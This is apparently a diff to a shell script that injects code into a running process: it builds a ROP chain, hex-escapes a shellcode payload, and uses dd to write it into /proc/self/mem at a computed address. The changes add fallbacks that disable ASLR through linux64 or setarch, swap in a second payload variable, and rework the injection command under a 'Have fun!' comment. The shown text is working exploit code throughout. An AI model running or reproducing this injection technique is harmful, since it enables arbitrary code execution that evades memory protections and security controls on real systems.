@@ -256,6 +256,17 @@ craft_rop()
     echo -n $retsled$rop
 }
 
+if [ $(command -v linux64) ]
+then
+    noaslr="linux64 -R"
+elif [ $(command -v setarch) ]
+then
+    noaslr="setarch `uname -m` -R"
+else
+    echo Error: I need some tool to disable ASLR. >&2
+    exit
+fi
+
 # Make zsh behave somewhat like bash
 if [ -n "$(/proc/self/exe --version 2> /dev/null | grep zsh)" ]
 then
@@ -307,8 +318,8 @@ fi
 rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
-payload=$(echo -n $rop$sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+payload=$(echo -n $rop$payload2 | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
-printf $payload | (sleep .1; linux64 -R env -i $filename bs=$rop_len \
-count=1 of=/proc/self/mem seek=$write_to_addr conv=notrunc oflag=seek_bytes \
-iflag=fullblock 2>&1)
+printf $payload |\
+(sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
+seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
